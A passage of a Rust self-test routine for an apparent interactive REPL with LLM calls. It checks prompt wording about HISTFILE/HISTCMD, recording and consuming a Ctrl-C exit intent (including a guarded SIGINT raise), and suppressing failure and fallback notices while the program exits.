        "prompt: HISTFILE/HISTCMD are not exported and not reliable",
        crate::prompt::DEFAULT_PROMPT.contains("$HISTFILE")
            && crate::prompt::DEFAULT_PROMPT.contains("$HISTCMD")
            && crate::prompt::DEFAULT_PROMPT.contains("NOT exported"),
    );

    // ── Ctrl-C exit intent (g-005 att-002) ──────────────────────────────────
    //
    // The REPL must never be left with a Ctrl-C that does nothing: the key is
    // either read as a key press (prompt/menus) or recorded as an intent that
    // the REPL consumes at its next safe point. These assertions cover the
    // intent primitive itself; the interactive behavior (one press at the idle
    // prompt, confirmation while busy) is exercised by the PTY-driven manual
    // tests in the attempt report.
    let _ = crate::ui::take_exit_request();
    check(
        "ctrl-c: no intent pending initially",
        !crate::ui::exit_requested(),
    );
    crate::ui::request_exit();
    check(
        "ctrl-c: request_exit records the intent",
        crate::ui::exit_requested(),
    );
    check(
        "ctrl-c: first take consumes the intent",
        crate::ui::take_exit_request(),
    );
    check(
        "ctrl-c: intent does not repeat (handled exactly once)",
        !crate::ui::take_exit_request() && !crate::ui::exit_requested(),
    );
    // With the REPL guard installed a real SIGINT must record the intent (and
    // not terminate the process). `raise` delivers it to this thread, so the
    // check is deterministic; when the OS refuses the handler the guard is
    // None and the raise is skipped (otherwise it would kill the test runner).
    #[cfg(unix)]
    {
        if let Some(guard) = crate::ui::ReplInterruptGuard::install() {
            let _ = crate::ui::take_exit_request();
            unsafe { libc::raise(libc::SIGINT) };
            check(
                "ctrl-c: SIGINT while busy records the intent instead of exiting",
                crate::ui::exit_requested(),
            );
            drop(guard);
            let _ = crate::ui::take_exit_request();
        }
    }
    // A Ctrl-C that aborts the request in flight must not surface as a
    // per-entry "model failed: ... Interrupted system call" line (or a
    // "Trying fallback:" banner) right before the exit question:
    // `call_llm_with_retry` gates those notices on the exit intent. Real
    // failures (no intent pending) still print.
    check(
        "ctrl-c: per-entry failure notice prints when not interrupted",
        crate::llm::notice_unless_leaving("m failed: e".to_string()).as_deref()
            == Some("m failed: e"),
    );
    crate::ui::request_exit();
    check(
        "ctrl-c: failure/fallback notices suppressed while leaving",
        crate::llm::notice_unless_leaving("m failed: e".to_string()).is_none()
            && crate::llm::notice_unless_leaving("Trying fallback: m (openai)...".to_string())
                .is_none(),
    );
    let _ = crate::ui::take_exit_request();
    check(
        "ctrl-c: notices resume once the intent is consumed",
        crate::llm::notice_unless_leaving("m failed: e".to_string()).is_some(),
    );

    // Summary
    println!("\n{} passed, {} failed", pass, fail);
    if fail > 0 {
        std::process::exit(1);
    }
}
